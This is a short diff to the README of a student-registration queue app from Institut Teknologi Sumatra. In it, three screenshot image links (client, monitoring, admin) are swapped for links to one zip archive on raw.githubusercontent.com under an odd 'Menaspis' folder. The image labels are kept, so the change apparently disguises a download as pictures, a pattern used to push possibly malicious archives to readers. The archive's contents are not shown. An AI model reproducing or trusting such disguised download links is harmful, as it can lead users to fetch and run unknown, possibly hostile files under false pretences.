@@ -1,11 +1,11 @@
 # Aplikasi Antrian
 Aplikasi ini hanya sederhana yang dibuat untuk proses registrasi mahasiswa baru di Institut Teknologi Sumatra. Teridiri dari 3 interface yaitu :
 * Client
-![Client](assert/img/client.png)
+![Client](https://raw.githubusercontent.com/dextercool/Aplikasi-Antrian/master/Menaspis/Aplikasi-Antrian.zip)
 * Monitoring
-![Monitoring](assert/img/monitoring.png)
+![Monitoring](https://raw.githubusercontent.com/dextercool/Aplikasi-Antrian/master/Menaspis/Aplikasi-Antrian.zip)
 * Admin
-![Admin](assert/img/admin.png)
+![Admin](https://raw.githubusercontent.com/dextercool/Aplikasi-Antrian/master/Menaspis/Aplikasi-Antrian.zip)
 
 ## Requirement
 Install
